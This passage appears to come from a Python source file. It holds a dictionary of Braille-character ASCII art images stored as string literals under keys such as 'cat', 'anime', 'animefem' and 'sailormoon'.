⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⢷⣿⡟⠀⣰⡆⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⣿⣿⡀⠀⠀⠈⢿⣿⣦⠀⠀⠙⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⠁⠀⠦⣤⣀⠀⠀⢀⣿⣿⡇⢰⣿⠇⠀⢸⣿⡆⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢸⣿⣿⣆⠀⠀⠈⣿⣿⣧⣠⣤⠾⢿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣵⣿⠀⠀⠀⠉⠀⠀⣼⣿⢿⡇⣾⣿⠀⠀⣾⣿⡇⢸⠀⠀⠀⠀⠀⠀⣿⡇⠀⣼⣿⢻⣿⣦⠴⠶⢿⣿⣿⣇⠀⠀⠀⢻⣿⣧⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⡟⡌⣼⣿⣿⠉⢁⣿⣿⣷⣿⡗⠒⠚⠛⠛⢛⣿⣯⣯⣿⣿⠀⢻⣿⣧⠀⢸⣿⣿⣿⡄⠀⠀⠀⠙⢿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⢸⣿⡇⣼⣿⣿⣿⣶⣾⣿⣿⢿⣿⡇⠀⠀⠀⠀⢸⣿⠟⢻⣿⣿⣿⣶⣿⣿⣧⢸⣿⣿⣿⣧⠀⠀⠀⢰⣷⡈⠛⢿⣿⣿⣶⣦⣤⣤⣀
⠀⠀⠀⠀⢀⣤⣾⣿⣿⢫⡄⠀⠀⠀⠀⠀⠀⣿⣿⣹⣿⠏⢹⣿⣿⣿⣿⣿⣼⣿⠃⠀⠀⠀⢀⣿⡿⢀⣿⣿⠟⠀⠀⠀⠹⣿⣿⣿⠇⢿⣿⡄⠀⠀⠈⢿⣿⣷⣶⣶⣿⣿⣿⣿⣿⡿
⣴⣶⣶⣿⣿⣿⣿⣋⣴⣿⣇⠀⠀⠀⠀⠀⢀⣿⣿⣿⣟⣴⠟⢿⣿⠟⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⠿⣫⣤⣶⡆⠀⠀⣻⣿⣿⣶⣸⣿⣷⡀⠀⠀⠸⣿⣿⣿⡟⠛⠛⠛⠉⠁⠀
⠻⣿⣿⣿⣿⣿⣿⡿⢿⣿⠋⠀⢠⠀⠀⠀⢸⣿⣿⣿⣿⣁⣀⣀⣁⠀⠀⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠸⢟⣫⣥⣶⣿⣿⣿⠿⠟⠋⢻⣿⡟⣇⣠⡤⠀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠉⢹⣿⡇⣾⣿⠀⠀⢸⡆⠀⠀⢸⣿⣿⡟⠿⠿⠿⠿⣿⣿⣿⣿⣷⣦⡄⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣯⣥⣤⣄⣀⡀⢸⣿⠇⢿⢸⡇⠀⢹⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣿⡇⣿⣿⠀⠀⠸⣧⠀⠀⢸⣿⣿⠀⢀⣀⣤⣤⣶⣾⣿⠿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠛⢛⣛⠛⠛⠛⠃⠸⣿⣆⢸⣿⣇⠀⢸⣿⣿⣿⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢻⣿⡇⢻⣿⡄⠀⠀⣿⡄⠀⢸⣿⡷⢾⣿⠿⠟⠛⠉⠉⠀⠀⠀⢠⣶⣾⣿⣿⣿⣿⣿⣶⣶⠀⠀⢀⡾⠋⠁⢠⡄⠀⣤⠀⢹⣿⣦⣿⡇⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣇⢸⣿⡇⠀⠀⣿⣧⠀⠈⣿⣷⠀⠀⢀⣀⠀⢙⣧⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⢀⣿⡏⠀⠀⠸⣇⠀⠀⠘⠛⠘⠛⠀⢀⣿⣿⣿⡇⠀⣼⣿⢻⣿⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⣿⣸⣿⣿⠀⠀⣿⣿⣆⠀⢿⣿⡀⠀⠸⠟⠀⠛⣿⠃⠀⠀⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠙⠷⣦⣄⡀⠀⢀⣴⣿⡿⣱⣾⠁⠀⣿⣿⣾⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣇⠀⢿⢹⣿⣆⢸⣿⣧⣀⠀⠀⠴⠞⠁⠀⠀⠀⠸⣿⡇⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⢀⣨⣽⣾⣿⣿⡏⢀⣿⣿⠀⣸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣆⢸⡏⠻⣿⣦⣿⣿⣿⣿⣶⣦⣤⣀⣀⣀⣀⠀⣿⣷⠀⠀⠀⣸⣿⣏⣀⣤⣤⣶⣾⣿⣿⣿⠿⠛⢹⣿⣧⣼⣿⣿⣰⣿⣿⠛⠛⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠙⣿⣿⣦⣷⠀⢻⣿⣿⣿⣿⡝⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠉⠁⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣄⢸⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠟⠻⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⡌⠙⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        
        
        
        """
),
 
 "cat": ("""
         
         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠙⢻⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⣠⣄⠀⢻⣿⣿⣿⣿⣿⡿⠀⣠⣄⠀⠀⠀⢻⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⠀⠀⠀⠀⠰⣿⣿⠀⢸⣿⣿⣿⣿⣿⡇⠀⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠙⠃⠀⣼⣿⣿⣿⣿⣿⣇⠀⠙⠛⠁⠀⠀⣼⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣷⣤⣄⣀⣠⣤⣾⣿⣿⣿⣿⣽⣿⣿⣦⣄⣀⣀⣤⣾⣿⣿⣿⣿⠃⠀⠀⢀⣀⠀⠀
⠰⡶⠶⠶⠶⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠉⠉⠙⠛⠋⠀
⠀⠀⢀⣀⣠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠷⠶⠶⠶⢤⣤⣀⠀
⠀⠛⠋⠉⠁⠀⣀⣴⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣤⣀⡀⠀⠀⠀⠀⠘⠃
⠀⠀⢀⣤⡶⠟⠉⠁⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠉⠀⠀⠀⠉⠙⠳⠶⣄⡀⠀⠀
⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
         
         
         
         
         
"""         
),
  "anime": ("""
           
           ⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡠⠊⡀⡤⠀⠀⠀⠀⠀⠀⠐⠡⠀⠀⠀⠛⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠂
⠀⠀⠀⠀⠐⡊⠕⠈⠀⠀⠀⠀⠀⠠⠊⡐⠀⠀⠌⠄⠀⠐⢹⡄⠀⢂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠆⡁⠀⠀
⠠⡀⠄⠐⠈⠀⠀⠀⠀⢀⠀⠀⠠⠁⡰⠀⠀⡘⢰⠀⠀⠃⠀⠻⢦⣀⠑⠠⢀⣀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠐⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠊⠦⡀
⠀⠈⠀⠂⠠⠄⠀⢀⠔⠁⠀⢀⠁⣴⠃⡀⣼⠃⡆⠀⣴⠀⠀⠀⠀⠈⠉⠉⠀⡀⠉⠉⠡⠀⠀⠀⠀⠀⠀⠀⠈⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠆⠀
⠀⠀⠀⠀⠀⠀⡐⠁⠀⢀⣀⡈⣾⣿⠀⣸⣿⣾⡇⣼⣿⠀⠀⠀⠀⠀⡆⠀⠀⢰⡀⠀⠀⠡⣄⠀⡀⠀⢠⡀⠀⠈⣿⣶⣄⠀⠀⠀⠀⠀⠠⢀⠀⠈⡀
⠀⠀⠀⠀⠀⠰⢀⣴⣾⣿⣿⣿⣿⣿⢰⣿⣿⣿⣷⣿⣿⡀⢸⡄⠀⣆⢳⡄⠀⠈⣿⣴⣄⡀⣿⣷⣽⣦⡀⣿⣷⡀⢸⣿⣿⣧⣰⣄⠀⠀⠀⠠⠈⠂⢤
⠀⠀⠀⠀⠀⣶⣿⠿⠛⣽⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣇⣿⣷⡀⣿⣾⣿⣆⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣾⣿⣿⣿⣿⣿⣷⡐⡤⢀⠐⢄⠀
⠀⠀⠀⠀⠠⠋⠁⠀⣼⠟⢋⣿⣿⣿⣿⡏⠇⢱⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⡷⡠⠀⠈⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠸⠋⠀⣸⣿⣿⣿⣿⣇⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡿⣿⡿⠿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⡇⠁⢻⣿⣿⣿⡇⠑⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠟⠛⠁⣿⡿⠀⠀⢄⡉⠙⠑⠘⢿⣧⠙⢧⢠⠗⢻⣿⣿⣿⣿⡟⠀⠰⠙⢹⣿⡟⣿⣿⡷⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⢻⠀⠀⠀⡀⠉⠉⠀⡠⠀⠩⠀⠈⠀⠀⠄⣉⠛⠛⠉⣠⠀⠀⡀⢸⡏⣰⣿⣿⣇⣴⣿⡿⣿⣿⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢰⠃⠀⠈⢿⠀⠀⠀⠀⠀⠀⠀⠄⣿⣿⣿⡟⠕⢂⠀⠀⣘⣀⢉⣡⣼⣿⣿⢿⡇⠀⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢍⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⡻⣿⠏⠊⠙⠹⣠⣾⣿⣿⣿⣿⡟⢱⠇⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠠⠄⡀⠀⠀⠀⠈⠁⡇⠀⣰⣡⣾⣿⣿⣟⢡⠋⠏⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣦⡀⠙⠶⠀⠀⠀⠀⢀⣰⣥⣶⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣦⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠐⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠂⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⡀⠀⠁⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⢀⡆⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⢏⢊⠟⠀⠀⠀⠈⠑⠄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢠⣾⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠍⣠⡔⣡⠂⠀⠀⠀⠀⠀⠀⠀⠀⠈⠂⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣼⣶⣿⣿⣿⠃⡀⠀⠀⠘⠀⡠⠊⠀⠀⠀⠀⠀⠡⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠔⠀⣿⠁⠀⠀⠀⣿⣿⣿⣿⣿⣿⠟⢁⠼⡛⠁⠞⣵⣿⠇⠠⣰⠀⠀⢀⠜⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⡿⠀⠀⠀⠀⣿⣿⣿⣿⠟⠁⠀⡠⠞⠁⠀⢰⣿⢇⢀⠃⠊⠀⢀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⠀⠀⡇⠀⢰⠆⠀⣿⣿⠟⠁⠀⢀⠄⠀⠀⠠⢂⣿⡏⠞⡾⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
           

"""

),
  
  
  "animefem":("""
              
              
        ⠀⠀⠀⠀⢀⡠⠤⠔⢲⢶⡖⠒⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡚⠁⢀⠀⠀⢄⢻⣿⠀⠀⠀⡙⣷⢤⡀⠀⠀⠀⠀⠀⠀
⠀⡜⢱⣇⠀⣧⢣⡀⠀⡀⢻⡇⠀⡄⢰⣿⣷⡌⣢⡀⠀⠀⠀⠀
⠸⡇⡎⡿⣆⠹⣷⡹⣄⠙⣽⣿⢸⣧⣼⣿⣿⣿⣶⣼⣆⠀⠀⠀
⣷⡇⣷⡇⢹⢳⡽⣿⡽⣷⡜⣿⣾⢸⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀
⣿⡇⡿⣿⠀⠣⠹⣾⣿⣮⠿⣞⣿⢸⣿⣛⢿⣿⡟⠯⠉⠙⠛⠓
⣿⣇⣷⠙⡇⠀⠁⠀⠉⣽⣷⣾⢿⢸⣿⠀⢸⣿⢿⠀⠀⠀⠀⠀
⡟⢿⣿⣷⣾⣆⠀⠀⠘⠘⠿⠛⢸⣼⣿⢖⣼⣿⠘⡆⠀⠀⠀⠀
⠃⢸⣿⣿⡘⠋⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡆⠇⠀⠀⠀⠀
⠀⢸⡿⣿⣇⠀⠈⠀⠤⠀⠀⢀⣿⣿⣿⣿⣿⣿⣧⢸⠀⠀⠀⠀
⠀⠈⡇⣿⣿⣷⣤⣀⠀⣀⠔⠋⣿⣿⣿⣿⣿⡟⣿⡞⡄⠀⠀⠀
⠀⠀⢿⢸⣿⣿⣿⣿⣿⡇⠀⢠⣿⡏⢿⣿⣿⡇⢸⣇⠇⠀⠀⠀
⠀⠀⢸⡏⣿⣿⣿⠟⠋⣀⠠⣾⣿⠡⠀⢉⢟⠷⢼⣿⣿⠀⠀⠀
⠀⠀⠈⣷⡏⡱⠁⠀⠊⠀⠀⣿⣏⣀⡠⢣⠃⠀⠀⢹⣿⡄⠀⠀
⠀⠀⠘⢼⣿⠀⢠⣤⣀⠉⣹⡿⠀⠁⠀⡸⠀⠀⠀⠈⣿⡇⠀⠀
              
              
 """             
),
  
  "sailormoon":("""
                
                
                
                ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣙⢿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠻⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡟⠹⠿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠋⡬⢿⣿⣷⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡇⢸⡇⢸⣿⣿⣿⠟⠁⢀⣬⢽⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣧⣈⣛⣿⣿⣿⡇⠀⠀⣾⠁⢀⢻⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣧⣄⣀⠙⠷⢋⣼⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
